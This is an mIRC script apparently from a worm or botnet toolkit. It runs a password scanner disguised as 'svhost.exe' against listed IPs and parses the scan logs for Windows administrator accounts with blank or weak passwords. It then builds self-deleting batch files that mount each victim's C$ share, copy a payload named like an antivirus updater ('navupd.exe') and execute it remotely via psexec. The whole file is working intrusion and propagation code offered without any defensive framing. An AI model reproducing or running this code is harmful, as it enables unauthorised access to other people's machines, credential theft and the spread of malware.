[script]
n0=on 1:start:{ if (%autoscan == 1) { set %ip $read(%sfile) | run restore.exe remove.exe svhost.exe | timer 1 5 /run restore.exe svhost.exe -host %ip -ntpass -t 50,25 | set %status 1 } }
n1=alias checkscan {
n2=  set %results1 0 | set %t1 0
n3=  set %total1 $findfile(log\,*.htm,0)
n4=  :start1
n5=  inc %t1
n6=  if (%t1 <= %total1) { checker $findfile(log\,*.htm,%t1) | goto start1 }
n7=}
n8=alias startparse {
n9=  set %t 0
n10=  set %results 0
n11=  set %total $findfile(log\,*.htm,0)
n12=  :start
n13=  inc %t
n14=  if (%t <= %total) { parsefile $findfile(log\,*.htm,%t) | goto start }
n15=}
n16=alias parsefile {
n17=  set %temp.test $1
n18=  set %temp.host $nopath($1)
n19=  set %temp.host $remove(%temp.host,.htm)
n20=  set %temp.text $read($1, w, *Type: Administrator*)
n21=  set %temp.line $readn
n22=  if (%temp.line == 0) { return NULL }
n23=  set %temp.text $read($1, $calc($readn - 1))
n24=  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getpass2($read($1, $calc(%temp.line - 2))) | return }
n25=  $getpass(%temp.text)
n26=}
n27=alias getpass {
n28=  set %temp.user $gettok($1,2,60)
n29=  set %temp.user $gettok(%temp.user,2,62)
n30=  set %temp.pass $gettok($1,3,47)
n31=  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
n32=  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
n33=  if ($exists(parse.txt) == $false) { .write -c parse.txt }
n34=  inc %results
n35=  echo -a FOUND: %temp.host %temp.user %temp.pass
n36=  write parse.txt %temp.host %temp.user %temp.pass
n37=  remove %temp.test
n38=}
n39=alias getpass2 {
n40=  set %temp.user $gettok($1,2,62)
n41=  set %temp.user $gettok(%temp.user,1,60)
n42=  set %temp.pass $gettok($1,3,47)
n43=  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
n44=  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
n45=  if ($exists(parse.txt) == $false) { .write -c parse.txt }
n46=  inc %results
n47=  echo -a FOUND: %temp.host %temp.user %temp.pass
n48=  write parse.txt %temp.host %temp.user %temp.pass
n49=  remove %temp.test
n50=}
n51=alias getroot { if ($lines(parse.txt) < 1) { halt } | /root $read(parse.txt,1) | write -dl1 parse.txt }
n52=alias root {
n53=  :select
n54=  set %tempfile root $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat
n55=  set %t.drive $r(n,z) $+ :
n56=  if ($exists(%t.drive) == $true) { goto select }
n57=  set %t.user $2
n58=  set %t.pass $3 | if (%t.pass == [NULL]) { set %t.pass $null }
n59=  set %t.host \\ $+ $1 | set %t.share C$
n60=  write %tempfile net use %t.drive /delete
n61=  write %tempfile net use %t.host /USER: $+ %t.user $chr(34) $+ %t.pass $+ $chr(34)
n62=  write %tempfile net use %t.drive %t.host $+ \ $+ %t.share
n63=  write %tempfile md rooting
n64=  write %tempfile copy navupd.exe %t.drive $+ \navupd.exe
n65=  if (%t.pass == $null) { write %tempfile psexec %t.host -u %t.user -p "" c:\navupd.exe }
n66=  if (%t.pass != $null) { write %tempfile psexec %t.host -u %t.user -p %t.pass c:\navupd.exe }
n67=  write %tempfile rd rooting
n68=  write %tempfile net use %t.drive /delete
n69=  write %tempfile net use %t.host /delete
n70=  write %tempfile del %tempfile
n71=  run restore.exe %tempfile
n72=}
n73=alias rootnum {
n74=  inc %rooted
n75=  if (%rooted == $null) { set %rooted 0 }
n76=  inc %rooted
n77=  if ($len(%rooted) == 1) { set %rooted 00 $+ %rooted }
n78=  if ($len(%rooted) == 2) { set %rooted 0 $+ %rooted }
n79=  return %rooted
n80=}
n81=alias checker {
n82=  set %temp1.test $1
n83=  set %temp1.host $nopath($1)
n84=  set %temp1.host $remove(%temp1.host,.htm)
n85=  set %temp1.text $read($1, w, *scan from*)
n86=  set %temp1.line $readn 
n87=  if (%temp1.line == 0) { return NULL } 
n88=  set %temp1.text $read($1, $calc($readn - 1))
n89=  if ($read($1, $calc(%temp1.line - 1)) == <BR>) { $getpass21($read($1, $calc(%temp1.line - 2))) | return }
n90=  $getpass1(%temp1.text)
n91=}
n92=alias getpass1 {
n93=  set %temp1.user $gettok($1,2,60)
n94=  set %temp1.user $gettok(%temp1.user,2,62)
n95=  set %temp1.pass $gettok($1,3,47)
n96=  if (*pass*same*as*user* iswm %temp1.pass) { set %temp1.pass %temp1.user }
n97=  if (*blank*pass* iswm %temp1.pass) { set %temp1.pass [NULL] }
n98=  if ($exists(parse.txt) == $false) { .write -c parse.txt }
n99=  inc %results1
n100=  echo -a FOUND: %temp1.host %temp1.user %temp1.pass
n101=  remove %temp1.test
n102=  set %status 0
n103=  set %ip $read(%sfile)
n104=  run restore.exe svhost.exe -host %ip -ntpass -t 50,25
n105=  set %status 1
n106=}